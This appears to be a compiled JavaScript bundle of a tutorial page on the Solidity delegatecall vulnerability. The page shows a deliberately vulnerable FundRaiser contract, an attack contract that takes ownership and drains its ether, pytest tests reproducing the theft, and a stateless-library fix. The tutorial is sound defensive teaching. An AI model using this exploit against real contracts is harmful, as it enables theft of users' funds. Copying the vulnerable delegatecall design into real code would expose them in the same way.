"use strict";(self.webpackChunkbuildany_website=self.webpackChunkbuildany_website||[]).push([[119],{3905:function(e,t,n){n.d(t,{Zo:function(){return d},kt:function(){return h}});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},i=Object.keys(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var c=a.createContext({}),s=function(e){var t=a.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},d=function(e){var t=s(e.components);return a.createElement(c.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},p=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,i=e.originalType,c=e.parentName,d=o(e,["components","mdxType","originalType","parentName"]),p=s(n),h=r,m=p["".concat(c,".").concat(h)]||p[h]||u[h]||i;return n?a.createElement(m,l(l({ref:t},d),{},{components:n})):a.createElement(m,l({ref:t},d))}));function h(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var i=n.length,l=new Array(i);l[0]=p;var o={};for(var c in t)hasOwnProperty.call(t,c)&&(o[c]=t[c]);o.originalType=e,o.mdxType="string"==typeof e?e:r,l[1]=o;for(var s=2;s<i;s++)l[s]=n[s];return a.createElement.apply(null,l)}return a.createElement.apply(null,n)}p.displayName="MDXCreateElement"},56517:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return o},contentTitle:function(){return c},metadata:function(){return s},toc:function(){return d},default:function(){return p}});var a=n(87462),r=n(63366),i=(n(67294),n(3905)),l=["components"],o={sidebar_position:5,tags:["delegatecall","solidity","attack"]},c="Delegate call",s={unversionedId:"solidity-hacks/delegatecall",id:"solidity-hacks/delegatecall",title:"Delegate call",description:"Description",source:"@site/docs/solidity-hacks/delegatecall.md",sourceDirName:"solidity-hacks",slug:"/solidity-hacks/delegatecall",permalink:"/docs/solidity-hacks/delegatecall",editUrl:"https://github.com/kkateq/blog/docs/solidity-hacks/delegatecall.md",tags:[{label:"delegatecall",permalink:"/docs/tags/delegatecall"},{label:"solidity",permalink:"/docs/tags/solidity"},{label:"attack",permalink:"/docs/tags/attack"}],version:"current",sidebarPosition:5,frontMatter:{sidebar_position:5,tags:["delegatecall","solidity","attack"]},sidebar:"tutorialSidebar",previous:{title:"Self destruct",permalink:"/docs/solidity-hacks/self-destruct"}},d=[{value:"Description",id:"description",children:[],level:3},{value:"How to test",id:"how-to-test",children:[],level:3},{value:"How to fix",id:"how-to-fix",children:[],level:3},{value:"Demo",id:"demo",children:[],level:3},{value:"Important note",id:"important-note",children:[],level:3}],u={toc:d};function p(e){var t=e.components,n=(0,r.Z)(e,l);return(0,i.kt)("wrapper",(0,a.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"delegate-call"},"Delegate call"),(0,i.kt)("h3",{id:"description"},"Description"),(0,i.kt)("p",null,"The ",(0,i.kt)("inlineCode",{parentName:"p"},"delegatecall")," opcode of Solidity allows delegating logic execution to another smart contract. For example, we want to call some useful smart contract that would handle the logic for us, e.g., SafeMath. However, such functionality may cause severe issues if the utility smart contract is stateful. Being identical to the opcode ",(0,i.kt)("inlineCode",{parentName:"p"},"call"),", the ",(0,i.kt)("inlineCode",{parentName:"p"},"delegatecall")," opcode carries its context over to the caller smart contract. And if it's stateful, it could override the caller's context."),(0,i.kt)("p",null,"Let's review the following example with the simple ",(0,i.kt)("inlineCode",{parentName:"p"},"FundRaiser")," smart contract that uses the ",(0,i.kt)("inlineCode",{parentName:"p"},"Owner")," library. Note that this is a simplified example to avoid complexity. But what's important is that the ",(0,i.kt)("inlineCode",{parentName:"p"},"Owner")," library has a similar layout to the ",(0,i.kt)("inlineCode",{parentName:"p"},"FundRaiser"),", meaning that the ",(0,i.kt)("inlineCode",{parentName:"p"},"owner")," variable declaration has the same declaration position here."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-solidity",metastring:"title=/contracts/delegatecall/FundRaiser.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/delegatecall/FundRaiser.sol",title:"/contracts/delegatecall/FundRaiser.sol",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/delegatecall/FundRaiser.sol"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract Owner {\n    // highlight-next-line\n    address public owner;\n\n    function setOwner() public {\n        owner = msg.sender;\n    }\n}\n\ncontract FundRaiser {\n    // highlight-next-line\n    address public owner;\n    uint256 balance;\n    address caller;\n\n    Owner public ownerService;\n\n    constructor(Owner _ownerService) {\n        owner = msg.sender;\n        ownerService = Owner(_ownerService);\n    }\n\n    function deposit() public payable {\n        balance += msg.value;\n    }\n\n    function withdraw() public onlyOwner {\n        require(msg.sender == owner);\n\n        require(balance > 0);\n\n        (bool sent, ) = owner.call{value: balance}("");\n\n        require(sent, "Transfer failed.");\n\n        balance = 0;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    fallback() external payable {\n        // highlight-next-line\n        address(ownerService).delegatecall(msg.data);\n    }\n}\n')),(0,i.kt)("p",null,"So the ",(0,i.kt)("inlineCode",{parentName:"p"},"Owner")," would embed the context into the ",(0,i.kt)("inlineCode",{parentName:"p"},"FundRaiser")," smart contract once the attacker executes the ",(0,i.kt)("inlineCode",{parentName:"p"},"fallback()")," function, which calls the ",(0,i.kt)("inlineCode",{parentName:"p"},"setOwner"),". Afterward, it's possible to call the ",(0,i.kt)("inlineCode",{parentName:"p"},"withdraw"),", and the ",(0,i.kt)("inlineCode",{parentName:"p"},"onlyOwner")," modifier would look to the new value of ",(0,i.kt)("inlineCode",{parentName:"p"},"owner"),"."),(0,i.kt)("p",null,"Let's consider the following example of the ",(0,i.kt)("inlineCode",{parentName:"p"},"Attack")," smart contract that would attempt to acquire the ",(0,i.kt)("inlineCode",{parentName:"p"},"FundRaiser")," funds:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-solidity",metastring:"title=/contracts/delegatecall/AttackFundRaiser.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/delegatecall/AttackFundRaiser.sol",title:"/contracts/delegatecall/AttackFundRaiser.sol",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/delegatecall/AttackFundRaiser.sol"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ninterface IFundRaiser {\n    function withdraw() external;\n\n    function setOwner() external;\n}\n\ncontract AttackFundRaiser {\n    address public fundRaiser;\n    event EtherReceived(uint256 value);\n\n    constructor(address _fundRaiser) {\n        fundRaiser = _fundRaiser;\n    }\n\n    function withdraw() public {\n        IFundRaiser(fundRaiser).withdraw();\n    }\n\n    function attack() public {\n        // TIP: Another way to call `fundRaiser.call(abi.encodeWithSignature("setOwner()"));`\n        // highlight-next-line\n        IFundRaiser(fundRaiser).setOwner();\n    }\n\n    function balanceOf() public view returns (uint256) {\n        return address(this).balance;\n    }\n\n    fallback() external payable {\n        emit EtherReceived(msg.value);\n    }\n}\n\n')),(0,i.kt)("h3",{id:"how-to-test"},"How to test"),(0,i.kt)("p",null,"Let's have a unit test reproducing this scenario:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-python",metastring:"sourceUrl=https://github.com/kkateq/solidity-hacks/blob/maintests/delegatecall/test_delegatecall.py title=/tests/delegatecall/test_delegatecall.py",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/maintests/delegatecall/test_delegatecall.py",title:"/tests/delegatecall/test_delegatecall.py"},'import pytest\nfrom brownie import exceptions\nfrom scripts.delegatecall.deploy_and_attack import (\n    deploy_attack,\n    deploy_fund_raiser,\n    deploy_fund_raiser_fixed,\n    deploy_owner_fixed,\n    deploy_owner_service,\n)\nfrom scripts.utils import get_attacker_account, get_user_account\nfrom web3 import Web3\n\n\ndef test_delegatecall_attack():\n    # 0. Deploy all contracts and send some funds over to the FundRaiser contract\n    owner_service_contract = deploy_owner_service()\n    fund_raiser_contract = deploy_fund_raiser(owner_service_contract.address)\n    attack_contract = deploy_attack(fund_raiser_contract.address)\n\n    tx = fund_raiser_contract.deposit(\n        {"from": get_user_account(), "value": Web3.toWei(15, "ether")}\n    )\n    tx.wait(1)\n\n    print(\n        f"User has deposited {fund_raiser_contract.balance() / 10**18} ETH to FundRaiser"\n    )\n\n    print(f"FundRaiser owner is \'{fund_raiser_contract.owner()}\'")\n\n    # 1. Call attack method of the Attack smart contract\n    attack_tx = attack_contract.attack({"from": get_attacker_account()})\n    attack_tx.wait(1)\n\n    assert fund_raiser_contract.owner() == attack_contract.address\n    assert fund_raiser_contract.balance() / 10**18 == 15\n    assert attack_contract.balanceOf() / 10**18 == 0\n\n    # 2. Withdraw the FundRaiser balance to Attack smart contract\n    withdraw_tx = attack_contract.withdraw({"from": get_attacker_account()})\n    withdraw_tx.wait(1)\n\n    #  highlight-next-line\n    assert fund_raiser_contract.balance() / 10**18 == 0\n    # highlight-next-line\n    assert attack_contract.balanceOf() / 10**18 == 15\n\n')),(0,i.kt)("p",null,"he unit test above demonstrates the exploit of the ",(0,i.kt)("inlineCode",{parentName:"p"},"delegatecall")," issue. The attacker easily transferred the raised funds over to the ",(0,i.kt)("inlineCode",{parentName:"p"},"Attack")," smart contract."),(0,i.kt)("p",null,"Note this is a trivial scenario, not necessarily any attack would attempt to transfer money. It could also break the contract logic by similarly modifying the contract state."),(0,i.kt)("h3",{id:"how-to-fix"},"How to fix"),(0,i.kt)("p",null,"The rule of thumb is to use the stateless ",(0,i.kt)("strong",{parentName:"p"},"library")," smart contracts. Also, Solidity provides the ",(0,i.kt)("inlineCode",{parentName:"p"},"library")," keyword for implementing the library smart contracts. This keyword would ensure the smart contract is stateless and not self-destructible. In general, if ",(0,i.kt)("inlineCode",{parentName:"p"},"delegatecall")," is used, it's necessary to pay attention to the state of all contracts in the application."),(0,i.kt)("p",null,"In our case, the fix is relatively simple:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-solidity",metastring:"title=/contracts/delegatecall/FundRaiserFixed.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/delegatecall/FundRaiserFixed.sol",title:"/contracts/delegatecall/FundRaiserFixed.sol",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/delegatecall/FundRaiserFixed.sol"},"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract OwnerFixed {\n    \x3c!-- No state --\x3e\n    function setOwner() public {\n        // Some logic here\n    }\n}\n\ncontract FundRaiserFixed {\n    ...\n}\n")),(0,i.kt)("h3",{id:"demo"},"Demo"),(0,i.kt)("p",null,"The following unit tests shows that the attack is failing after the changes:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-python",metastring:"sourceUrl=https://github.com/kkateq/solidity-hacks/blob/maintests/delegatecall/test_delegatecall.py title=/tests/delegatecall/test_delegatecall.py",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/maintests/delegatecall/test_delegatecall.py",title:"/tests/delegatecall/test_delegatecall.py"},'\ndef test_delegatecall_attack_failed():\n    # 0. Deploy all contracts and send some funds over to the FundRaiser contract\n    owner_service_contract = deploy_owner_fixed()\n    fund_raiser_contract = deploy_fund_raiser_fixed(owner_service_contract.address)\n    attack_contract = deploy_attack(fund_raiser_contract.address)\n\n    tx = fund_raiser_contract.deposit(\n        {"from": get_user_account(), "value": Web3.toWei(15, "ether")}\n    )\n    tx.wait(1)\n\n    print(\n        f"User has deposited {fund_raiser_contract.balance() / 10**18} ETH to FundRaiser"\n    )\n\n    print(f"FundRaiser owner is \'{fund_raiser_contract.owner()}\'")\n\n    # 1. Call attack method of the Attack smart contract\n    attack_tx = attack_contract.attack({"from": get_attacker_account()})\n    attack_tx.wait(1)\n\n    assert fund_raiser_contract.owner() != attack_contract.address\n    assert fund_raiser_contract.balance() / 10**18 == 15\n    assert attack_contract.balanceOf() / 10**18 == 0\n\n    with pytest.raises(exceptions.VirtualMachineError):\n        # 2. Withdraw the FundRaiser balance to Attack smart contract\n        withdraw_tx = attack_contract.withdraw({"from": get_attacker_account()})\n        withdraw_tx.wait(1)\n\n    #  highlight-next-line\n    assert fund_raiser_contract.balance() / 10**18 == 15\n    #  highlight-next-line\n    assert attack_contract.balanceOf() / 10**18 == 0\n\n')),(0,i.kt)("h3",{id:"important-note"},"Important note"),(0,i.kt)("p",null,"If we change the ",(0,i.kt)("inlineCode",{parentName:"p"},"Owner")," layout to the following:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-solidity"},"\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract Owner {\n    uint256 public anything;\n    // highlight-next-line\n    address public owner;\n\n    function setOwner() public {\n        owner = msg.sender;\n    }\n}\n\ncontract FundRaiser {\n    // highlight-next-line\n    address public owner;\n    uint256 balance;\n    address caller;\n    ...\n\n}\n\n")),(0,i.kt)("p",null,"The issue would not be reproducible. It's not the fix, however, that you should consider!"),(0,i.kt)("p",null,(0,i.kt)("strong",{parentName:"p"},"Thank you for reading and good luck with building secure blockchain!")))}p.isMDXComponent=!0}}]);